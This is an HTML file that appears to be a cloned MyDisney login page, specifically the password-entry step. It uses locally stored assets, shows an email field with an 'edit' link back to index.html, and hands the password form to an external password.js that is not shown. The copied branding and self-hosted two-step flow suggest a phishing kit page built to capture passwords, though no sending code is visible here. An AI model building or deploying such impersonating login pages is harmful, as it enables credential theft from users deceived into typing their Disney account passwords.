<html lang="">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width initial-scale=1" name="viewport" />
    <title>Login - Password</title>
    <link rel="icon" href="./assets/ico.png">
    <link rel="stylesheet" href="./assets/css/styles.css">
    <style>
        body {
            background: radial-gradient(circle at 20% 95%, #056877, #051828 96%);
            margin: 0;
            padding: 0;
            height: 100vh;
        }
    </style>
</head>

<body>

    <div id="root">
        <div data-focus-lock-disabled="false">
            <div class="lightbox-bg modal d-block branded" tabindex="-1">
                <div class="actions-bar">
                    <a href="index.html" class="btn-back rounded-circle" data-testid="-back" id="back">
                        <img src="./assets/svg/0.svg" alt="Back" />
                    </a>
                </div>

                <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="Title">
                    <header class="header">
                        <div aria-label="theme account" class="logo logo-primary" data-testid="-logo" id="logo"
                            role="img"></div>
                    </header>
                    <div class="modal-content view view-starry-night bottom-grow">
                        <div class="modal-body">
                            <form class="d-grid gap-4 login-identity-flow" method="post" id="loginForm">
                                <div class="d-grid gap-2">
                                    <img src="./assets/svg/2.svg" style="width: 87px;">
                                    <h1 class="title" id="Title" tabindex="0"><span role="text">Enter your
                                            password</span></h1>
                                    <p class="text-block description" id="LoginIdentitySubHeader"
                                        data-testid="LoginIdentitySubHeader">
                                    </p>
                                    <p class="text-block description"><span id="displayEmail">your email</span> <a
                                            href="index.html">edit</a></p>

                                    <p class="text-block description" id="LoginIdentitySubHeaderSecondary"
                                        data-testid="LoginIdentitySubHeaderSecondary">Enter your current password to log
                                        in.</p>
                                </div>
                                <div class="d-grid gap-1">
                                    <div data-testid="InputPassword-wrapper" class="input-text input-text-InputPassword"
                                        for="InputPassword">
                                        <div data-testid="InputPassword-container"
                                            class="form-group form-floating input-wrapper">
                                            <input class="input-InputPassword form-control" type="password"
                                                autocapitalize="off" autocomplete="current-password" autocorrect="off"
                                                spellcheck="false" tabindex="0" id="InputPassword" name="InputPassword"
                                                data-testid="InputPassword" placeholder="Password" aria-invalid="false"
                                                aria-required="true" required="" />
                                            <label for="InputPassword" aria-hidden="true">Password</label>
                                            <button id="toggle-password" class="btn btn-icon btn-none" tabindex="0"
                                                data-testid="InputPassword-toggle-password" type="button"
                                                aria-label="show password">
                                                <img src="./assets/svg/3.svg" /><img src="./assets/svg/5.svg" />
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div class="d-grid gap-4">
                                    <div id="BtnSet-wrapper" class="BtnSubmitSet">
                                        <button type="submit" class="btn btn-submit btn-primary" id="BtnSubmit"
                                            data-testid="BtnSubmit" tabindex="0">Log In</button>
                                    </div>
                                </div>
                                <div id="LearnMore" aria-expanded="false" class="learn-more accordion accordion-flush">
                                    <div class="accordion-item">
                                        <h2 class="accordion-header">
                                            <button type="button" aria-expanded="false"
                                                class="accordion-button collapsed">
                                                <div tabindex="0" class="accordion-focus">
                                                    <img src="./assets/svg/4.svg" />Learn more about MyDisney
                                                </div>
                                            </button>
                                        </h2>
                                        <div class="accordion-collapse collapse sf-hidden"></div>
                                    </div>
                                </div>
                            </form>
                            <span class="session-id" tabindex="-1">
                                <input autocapitalize="none" autocomplete="off" autocorrect="off"
                                    data-testid="session-id" id="session-id" placeholder="session-id" spellcheck="false"
                                    tabindex="-1" type="text" value="" />
                            </span>
                            <div class="global-overlay" role="alert">
                                <div class="loading-container"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="./assets/js/password.js"></script>
</body>

</html>
